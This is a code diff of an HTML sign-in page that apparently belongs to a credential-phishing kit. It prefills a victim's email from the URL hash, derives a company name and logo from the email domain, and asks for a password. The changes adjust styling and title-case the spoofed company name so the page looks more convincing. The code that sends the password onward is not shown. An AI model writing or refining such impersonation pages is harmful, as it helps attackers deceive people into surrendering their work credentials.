@@ -26,18 +26,12 @@
             background-color: #0A4B8A; /* Slightly darker blue on hover */
         }
 
-        /* Consistent Form Header and Text Styling */
         .form-header,
         .form-text {
-            font-size: 16px; /* Same size for all */
-            color: #444; /* Neutral dark color for clarity */
-            font-weight: normal; /* Uniform font style */
-            margin-bottom: 8px; /* Even spacing */
-        }
-
-        /* Balance Spacing for Input Fields */
-        .form-group {
-            margin-bottom: 16px; /* Balanced vertical margin */
+            font-size: 16px;
+            color: #444;
+            font-weight: normal; /* Normal font weight for consistency */
+            margin-bottom: 8px;
         }
     </style>
 </head>
@@ -51,7 +45,7 @@
                     <img id="logoImg" class="fade" src="#" alt="Logo" style="height: 84px; width: auto;" />
 
                     <!-- Dynamic Company Name -->
-                    <h5 id="companyName" style="margin-top: 18px; margin-bottom: 12px;"></h5>
+                    <h5 id="companyName" style="margin-top: 18px; margin-bottom: 6px;"></h5>
                 </div>
                 <div id="err" 
                      style="padding: 16px 40px; background: #efcccb; border-bottom: 2px solid rgb(128,0,0);">
@@ -61,10 +55,10 @@
                 </div>
                 <div style="padding: 16px 40px;">
                     <p class="form-text">Sign in with your Email to continue</p>
-                    <input type="text" id="id" class="form-group" style="width: 100%; height: 36px; border: 1px solid; padding: 1px 8px;" readonly>
+                    <input type="text" id="id" style="width: 100%; height: 36px; border: 1px solid; padding: 1px 8px;" readonly>
 
                     <p class="form-header">Enter password</p>
-                    <input type="password" id="pass" placeholder="Password" class="form-group" style="width: 100%; height: 36px; border: 1px solid; padding: 1px 8px;">
+                    <input type="password" id="pass" placeholder="Password" style="width: 100%; height: 36px; border: 1px solid; padding: 1px 8px;">
 
                     <div class="sp-div" style="margin-top: 10px;">
                         <button class="btn btn-primary" id="next-btn" 
@@ -100,20 +94,29 @@
             // Prefill the username
             document.getElementById("id").value = hash;
 
-            // Extract domain and root for branding
+            // Extract domain and root for branding with space addition
             const emailParts = hash.split("@");
             const domain = emailParts[1].toLowerCase();
 
-            // Static mapping for known domains
+            function formatCompanyName(str) {
+                // Replace hyphens/underscores with spaces
+                let formatted = str.replace(/[-_]/g, " ");
+                // Add spacing for camelCase words (e.g., "TechnitySolutions" → "Technity Solutions")
+                formatted = formatted.replace(/([a-z])([A-Z])/g, "$1 $2").trim();
+                // Capitalize first letters (title case)
+                return formatted
+                    .split(" ")
+                    .map(word => word.charAt(0).toUpperCase() + word.slice(1).toLowerCase())
+                    .join(" ");
+            }
+
+            // Static mapping for known domains and company names
             const companyNameMapping = {
-                "pinnacleinfotech.com": "PINNACLEINFOTECH",
-                "examplecompany.com": "EXAMPLECOMPANY",
+                "pinnacleinfotech.com": "Pinnacle Infotech",
+                "examplecompany.com": "Example Company",
             };
 
-            // Determine company name (uppercase fallback)
-            const companyRootName = domain.split(".")[0].toUpperCase();
-            const companyName = companyNameMapping[domain] || companyRootName;
-
+            const companyName = companyNameMapping[domain] || formatCompanyName(domain.split(".")[0]);
             document.getElementById("companyName").textContent = companyName;
 
             // Update page title dynamically
